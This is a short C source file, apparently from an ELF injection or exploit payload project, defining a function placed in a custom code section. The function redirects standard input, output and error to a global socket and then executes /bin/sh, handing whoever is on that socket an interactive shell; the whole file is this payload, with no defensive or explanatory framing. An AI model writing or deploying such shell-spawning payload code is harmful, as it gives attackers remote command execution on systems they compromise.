
#include "elf_utils.h"
#include "payload.h"

SECTION(ELF_CODE) void setup_payload(void)
{
    dup2(g_sockfd, 0);
    dup2(g_sockfd, 1);
    dup2(g_sockfd, 2);

    char * const argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
}

